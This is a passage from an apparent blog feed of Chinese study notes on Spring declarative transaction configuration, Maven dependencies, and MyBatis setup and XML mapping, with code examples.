class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSourceTransactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="结合aop实现的事物的织入"><a href="#结合aop实现的事物的织入" class="headerlink" title="结合aop实现的事物的织入"></a>结合aop实现的事物的织入</h5><ul><li>配置事务通知</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"dataSourceTransactionManager"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        给那些方法配置事物--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置事物的传播特性--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>配置事务切入</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    配置事物的切入--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">              </span><br><span class="line">                <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"txPointCut"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.huzai.mapper.*.*(..))"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"txPointCut"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="编程式事物-需要在代码中进行事物的管理"><a href="#编程式事物-需要在代码中进行事物的管理" class="headerlink" title="编程式事物:需要在代码中进行事物的管理"></a>编程式事物:需要在代码中进行事物的管理</h4><h2 id="所有的配置文件头"><a href="#所有的配置文件头" class="headerlink" title="所有的配置文件头"></a>所有的配置文件头</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:jdbc</span>=<span class="string">"http://www.springframework.org/schema/jdbc"</span> <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/aop/spring-aop.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/jdbc http://www.springframework.org/schema/jdbc/spring-jdbc.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx </span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="所有的dependency"><a href="#所有的dependency" class="headerlink" title="所有的dependency"></a>所有的dependency</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.49<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resource<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Mybatis学习总结</title>
      <link href="/2020/10/17/Mybatis%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/17/Mybatis%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis-学习总结"><a href="#Mybatis-学习总结" class="headerlink" title="Mybatis 学习总结"></a>Mybatis 学习总结</h1><h2 id="基本环境配置"><a href="#基本环境配置" class="headerlink" title="基本环境配置"></a>基本环境配置</h2><h3 id="1-Mybatis-config-xml"><a href="#1-Mybatis-config-xml" class="headerlink" title="1.Mybatis-config.xml"></a>1.Mybatis-config.xml</h3><ul><li>配置参数按照如此下顺序配置-</li><li><strong>properties</strong>/<strong>settings</strong>/<strong>typeAliases</strong>/typeHandlers/objectFactory/objectWrapperFactory/plugins/<strong>environments</strong>/databaseIdProvider/<strong>mappers</strong></li><li>所有的*Mapper.xml需要在Mapper中注册</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">  PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">  "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">"org/mybatis/example/BlogMapper.xml"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-构建sqlsessionFactory"><a href="#2-构建sqlsessionFactory" class="headerlink" title="2.构建sqlsessionFactory"></a>2.构建sqlsessionFactory</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String resource = <span class="string">"org/mybatis/example/mybatis-config.xml"</span>;</span><br><span class="line">InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br></pre></td></tr></table></figure><p><img src="/home/huzai/下载/Sqlsessionactory构建过程.png" alt="Sqlsessionactory构建过程"></p><h3 id="3-Mapper-xml"><a href="#3-Mapper-xml" class="headerlink" title="3.*Mapper.xml"></a>3.*Mapper.xml</h3><ul><li>命名空间必须指向方法的接口</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mapper</span></span><br><span class="line"><span class="meta">  PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"</span></span><br><span class="line"><span class="meta">  "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.mybatis.example.BlogMapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectBlog"</span> <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">    select * from Blog where id = #&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>于此同时，我们也可以通过注解对一些简单的sql语句映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mybatis.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Select</span>(<span class="string">"SELECT * FROM blog WHERE id = #&#123;id&#125;"</span>)</span><br><span class="line">  <span class="function">Blog <span class="title">selectBlog</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="XML配置"><a href="#XML配置" class="headerlink" title="XML配置"></a>XML配置</h2><h3 id="1-properties"><a href="#1-properties" class="headerlink" title="1. properties"></a>1. properties</h3><ul><li>加载外部配置文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">"org/mybatis/example/config.properties"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"dev_user"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"F2Fa3!33TYyg"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-typeAliases"><a href="#3-typeAliases" class="headerlink" title="3.typeAliases"></a>3.typeAliases</h3><ul><li><p>设置别名 可以为每个pojo设置；也可以直接指定包名，mybatis会扫描package下面所有的javabean；也可以通过注解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"domain.blog"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-environments"><a href="#4-environments" class="headerlink" title="4.environments"></a>4.environments</h3><ul><li><p>尽管可以配置多个数据库环境，但每个SqlsessionFactory只能选择一种环境</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"..."</span> <span class="attr">value</span>=<span class="string">"..."</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="5-mappers"><a href="#5-mappers" class="headerlink" title="5.mappers"></a>5.mappers</h3><ul><li><p>告诉mybatis到哪里寻找配置文件。可以通过直接指定xml文件；也可以通过加载同名class；还可以通过扫描mapper所在的package。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 将包内的映射器接口实现全部注册为映射器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"org.mybatis.builder"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="XML映射文件"><a href="#XML映射文件" class="headerlink" title="XML映射文件"></a>XML映射文件</h2><ul><li><p><code>cache</code> – 该命名空间的缓存配置。</p></li><li><p><code>cache-ref</code> – 引用其它命名空间的缓存配置。</p></li><li><p><code>resultMap</code> – 描述如何从数据库结果集中加载对象，是最复杂也是最强大的元素。</p><p>解决pojo中属性名与数据库中列名不想等的情况</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"userResultMap"</span> <span class="attr">type</span>=<span class="string">"User"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"user_id"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"username"</span> <span class="attr">column</span>=<span class="string">"user_name"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"password"</span> <span class="attr">column</span>=<span class="string">"hashed_password"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUsers"</span> <span class="attr">resultMap</span>=<span class="string">"userResultMap"</span>&gt;</span></span><br><span class="line">  select user_id, user_name, hashed_password</span><br><span class="line">  from some_table</span><br><span class="line">  where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多对一的映射</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"author"</span> <span class="attr">javaType</span>=<span class="string">"Author"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"author_id"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"username"</span> <span class="attr">column</span>=<span class="string">"author_username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"password"</span> <span class="attr">column</span>=<span class="string">"author_password"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"email"</span> <span class="attr">column</span>=<span class="string">"author_email"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"bio"</span> <span 